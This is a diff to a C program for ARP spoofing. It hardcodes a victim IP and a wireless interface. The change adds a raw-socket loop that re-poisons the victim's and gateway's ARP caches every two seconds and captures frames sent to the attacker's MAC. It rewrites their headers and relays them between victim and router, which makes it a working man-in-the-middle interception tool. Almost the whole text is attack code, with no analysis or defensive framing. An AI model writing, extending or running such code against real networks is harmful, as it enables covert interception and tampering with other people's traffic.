@@ -1,4 +1,8 @@
 #include "core.h"
+#include <time.h>
+
+static u8 MESSAGE_BUFFER[1 << 10];
+static u8 BYTES_BUFFER[1 << 16];
 
 void arp_spoof(
     int sock,
@@ -46,7 +50,7 @@ void arp_spoof(
 }
 
 void main(void) {
-    int sock = get_arp_socket();
+    int arp_sock = get_arp_socket();
 
     char* if_name = "wlp1s0";
     u32 victim_addr_hl = inet_addr("192.168.0.101");
@@ -58,7 +62,9 @@ void main(void) {
     printf("\n");
 
     printf("Gateway mac:      ");
-    Mac gateway_mac = request_target_mac(sock, if_name, gateway_addr_hl);
+    Mac gateway_mac = request_target_mac(
+        arp_sock, if_name, gateway_addr_hl
+    );
     print_mac(gateway_mac);
     printf("\n");
 
@@ -79,23 +85,117 @@ void main(void) {
     printf("\n");
 
     printf("Victim mac:       ");
-    Mac victim_mac = request_target_mac(sock, if_name, victim_addr_hl);
+    Mac victim_mac = request_target_mac(arp_sock, if_name, victim_addr_hl);
     print_mac(victim_mac);
     printf("\n");
 
     printf("------------------------------------\n");
     printf("Spoofing...\n");
+    int raw_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (raw_sock == -1) {
+        perror("socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))");
+        exit(1);
+    }
+
+    sockaddr_ll addr_ll = {0};
+    addr_ll.sll_family = AF_PACKET;
+    addr_ll.sll_ifindex = if_nametoindex(if_name);
+    if (bind(raw_sock, (sockaddr*)&addr_ll, sizeof(addr_ll)) == -1) {
+        perror("bind(raw_sock, ...)");
+        exit(1);
+    }
+
+    time_t start_time = 0;
+    int elapsed_time = 0;
+
     do {
-        arp_spoof(
-            sock,
-            if_name,
-            attacker_mac,
-            gateway_addr_hl,
-            victim_mac,
-            victim_addr_hl
+        time_t current_time = time(NULL);
+        elapsed_time = current_time - start_time;
+        if (elapsed_time > 2.0) {
+            arp_spoof(
+                arp_sock,
+                if_name,
+                attacker_mac,
+                gateway_addr_hl,
+                victim_mac,
+                victim_addr_hl
+            );
+            start_time = current_time;
+            printf("arp_spoof\n");
+        }
+
+        // Wait for an incoming packet
+        int packet_size = recv(
+            raw_sock, BYTES_BUFFER, sizeof(BYTES_BUFFER), 0
         );
-        sleep(1.0);
+        if (packet_size == -1) {
+            perror("recv(raw_sock, ...)");
+            continue;
+        }
+
+        struct ether_header* eth_header = (struct ether_header*)
+            BYTES_BUFFER;
+
+        // Check if the packet is for the target machine
+        if (memcmp(
+                eth_header->ether_dhost, attacker_mac.bytes, ETHER_ADDR_LEN
+            )
+            != 0) {
+            continue;
+        }
+
+        // Modify the packet's destination MAC address to the router's MAC
+        // address
+        memcpy(eth_header->ether_dhost, gateway_mac.bytes, ETHER_ADDR_LEN);
+
+        // Modify the packet's source MAC address to the proxy's MAC
+        // address
+        memcpy(
+            eth_header->ether_shost, attacker_mac.bytes, ETHER_ADDR_LEN
+        );
+
+        // Send the modified packet to the router
+        if (send(raw_sock, BYTES_BUFFER, packet_size, 0) == -1) {
+            sprintf(
+                MESSAGE_BUFFER,
+                "Can't send(raw_sock, ...), packet size: %d",
+                packet_size
+            );
+            perror(MESSAGE_BUFFER);
+            continue;
+        }
+
+        // Wait for the router's response
+        packet_size = recv(
+            raw_sock, BYTES_BUFFER, sizeof(BYTES_BUFFER), 0
+        );
+        if (packet_size == -1) {
+            perror("recv(raw_sock, ...)");
+            continue;
+        }
+
+        // Modify the response's source MAC address to the target machine's
+        // MAC address
+        memcpy(
+            eth_header->ether_shost,
+            eth_header->ether_dhost,
+            ETHER_ADDR_LEN
+        );
+        memcpy(eth_header->ether_dhost, victim_mac.bytes, ETHER_ADDR_LEN);
+
+        // Send the modified response back to the target machine
+        if (send(raw_sock, BYTES_BUFFER, packet_size, 0) == -1) {
+            sprintf(
+                MESSAGE_BUFFER,
+                "Can't send(raw_sock, ...), packet size: %d",
+                packet_size
+            );
+            continue;
+        }
+
+        printf("STEP!\n");
     } while (1);
 
-    close(sock);
+    close(arp_sock);
+    close(raw_sock);
 }
